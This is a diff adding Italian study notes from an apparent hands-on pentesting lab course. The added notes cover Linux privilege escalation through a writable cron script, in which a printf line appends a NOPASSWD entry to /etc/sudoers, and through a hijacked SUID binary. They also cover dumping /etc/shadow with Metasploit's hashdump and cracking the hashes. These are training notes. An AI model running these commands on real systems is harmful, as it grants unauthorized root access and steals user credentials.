@@ -540,11 +540,11 @@ Tool come mimikatz vanno a leggere la cache del processo LSASS che interagisce c
 
 #### LM Hash
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### NTLM Hash
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Non hanno password salts, quindi possono essere craccate con brute force e rainbow attack.
 
@@ -1070,3 +1070,171 @@ Per verificare se siamo utenti privilegiati proviamo a fare cat del file /etc/sh
 
 ### Exploiting Misconfigured Cron Jobs
 
+Se il shell script nel cronjob può essere modificato da ogni utente, quindi è stato misconfigurato, allora possiamo modificare lo script nel cronjob e ottenere quindi l'esecuzione di comandi che vogliamo.
+
+Per elevare i privilegi possiamo ad esempio connetterci ad un netcat listener oppure aggiungere un utente a cui abbiamo già accesso al file sudoers, in modo da poter poi eseguire task che richiedono root privileges senza inserire ulteriori password.
+
+#### Fasi dell'exploiting
+
+1. Identificare quali file/script sono usati da un cronjob
+2. Identificare se quello shell script richiamato nel cronjob può essere modificato da un utente non privilegiato
+3. modificare lo script inserendo un comando che aggiunga l'utente con il quale abbiamo accesso al file sudoers
+
+#### Capire se l'utente con il quale abbiamo accesso alla vittima è nei sudoers
+
+```
+whoami
+groups <nome utente>
+cat /etc/shadown
+```
+
+#### Identificare i file con associati dei cron job
+
+```
+crontab -l //per verificare se abbiamo dei cron job con l'utente loggato
+```
+
+Dobbiamo cercare dei file che potrebbero essere coinvolti in cron job, come ad esempio un file con solo i permessi per l'utente root in una cartella dove l'utente è un altro, oppure dei file plausibili che non possiamo vedere o modificare come utenti normali (wuindi con permessi tipo _-rw-------_).
+
+Per identificare dove questo file viene chiamato (e quindi probabilmente il file crontab dove è contenuto) possiamo cercare la stringa del path con l'utility grep. E trovare quindi uno script che chiami questo file. Se possiamo modificare lo script (se i permessi malconfigurati ce lo concedono), allora possiamo decidere di inserire righe di codice che eseguano azioni malevole a nostro favore (es. aggiungere il nostro utente ai sudoers).
+
+```
+ls -al
+pd
+cat message
+cd /
+grep -rnw /usr -e "/home/student/message"   //la cartella /usr è dove tipicamente troviamo degli shell script
+// è presente un file /usr/local/share/copy.sh che fa una copia di questo file message in /tmp/
+ls -al /tmp
+cat /tmp/message
+ls -al /usr/local/share/copy.sh //dato che è modificabile vogliamo inserire una riga di codice qui dentro, così da essere eseguita da crontab
+cat /usr/local/share/copy.sh
+```
+
+Guardando il file script /usr/local/share/copy.sh vediamo che il file appartiene a root, ma i permessi sono settati per consentire lettura, modifica ed esecuzione a tutti gli utenti.\
+Dato che è modificabile vogliamo inserire una riga di codice qui dentro, così da essere eseguita da crontab. Il cronjob associato non sappiamo quando verrà eseguito nella realtà. Ai fini del laboratorio viene eseguito ogni minuto ed è possibile vederlo dal fatto che il file di copia che abbiamo identificato in /tmp/message viene aggiornato ogni minuto.
+
+#### Modificare il file script
+
+In questo lab environment non abbiamo dei text editor installati, per cui dobbiamo trovare un modo ingegnoso di modificare il file, e lo faremo con **printf**:
+
+```
+printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+sudo -l //Possiamo verificare gli utenti che sono parte di sudoers e vedere che la riga è stata aggiunta (dopo l'esecuzione del cron job)
+sudo su //e funziona
+whoami //root user
+cd /root
+ls
+cat flag
+```
+
+Ciò che stiamo dicendo di fare è di fare un redirect dell'output "student ALL=NOPASSWD:ALL" nel file sudoers. \
+Quella stringa significa che l'utente student dovrebbe avere ALL privileges e non ha bisogno di specificare la password.
+
+### Exploiting SUID Binaries
+
+#### Identificazione di un file con SUID permission
+
+Sulla macchina target
+
+```
+whoami
+groups student
+pwd
+ls -al
+```
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Nella home dell'utente ci sono due file: greetings e welcome. Welcome appartiene all'utente root ma possiamo eseguirlo dato che ci sono le x. Ma se poniamo attenzione alla s, quella s è l'SUID permission è applicata a questo file.
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+#### Static Analysis del file con SUID e delle chiamate per sfruttarlo
+
+```
+file welcome
+strings welcome //notiamo una chiamata al binary greetings
+```
+
+#### Creazione o modifica del file chiamato dal programma con SUID per fare privilege escalation
+
+```
+rm greetings //eliminiamo il file greetings per sostituirlo
+cp /bin/bash greetings
+ls
+./welcome
+id
+whoami
+cat /etc/shadow
+```
+
+## Linux Credential Dumping
+
+### Dumping Linux Password Hashes
+
+* Tutte le password crittografate per gli utenti sono archiviate nel file shadow. Si trova nella seguente directory: `/etc/shadow`
+* Il file shadow può essere acceduto e letto solo dall'account root, questa è una caratteristica di sicurezza molto importante in quanto impedisce ad altri account sul sistema di accedere alle password sottoposte ad hashing.
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+In Linux con l'hash delle password non possiamo farci molto se non craccarli per ottenere la password.
+
+#### Se si ha già accesso alla vittima
+
+```
+cat /etc/shadow
+```
+
+#### Per aprire una sessione meterpreter dopo aver fatto accesso con exploit module MSF
+
+```
+exploit
+/bin/bash -i
+id
+CTRL+Z -> background session? Y
+sessions
+sessions -u 1 // ci dà un errore ma crea comunque la sessione con meterpreter
+sessions
+sessions 2
+sysinfo
+```
+
+#### hashdump: Modulo MSF alternativo per dumpare hash password
+
+```
+/etc/init.d/postgresql start & msfconsole
+search hashdump
+use post/linux/gather/hashdump
+show options
+set SESSION 2 //la sessione che abbiamo già attiva a seguito dell'exploitation del servizio ProFTPD
+run
+```
+
+Quello che questo modulo fa è identificare tutti gli utenti nel file /etc/shadow che hanno una password impostata e li salva in un file, in versione unshadowed. In poche parole viene salvata la password in un formato che può essere craccato.
+
+### Password cracking from Hash
+
+#### Per identificare vulnerabilità per un servizio trovato con nmap (es. ProFTPD 1.3.3c)
+
+```
+nmap --script vuln -p 21 demo.ine.local
+```
+
+#### Modulo MSF per dump hash credenziali vittima
+
+Da utilizzare dopo aver ottenuto una sessione con un altro exploit MSF
+
+```
+use post/linux/gather/hashdump
+set SESSION 1
+exploit
+```
+
+#### Modulo MSF auxiliary per crackare l'hash delle password
+
+```
+use auxiliary/analyze/crack_linux
+set SHA512 true
+run
+```
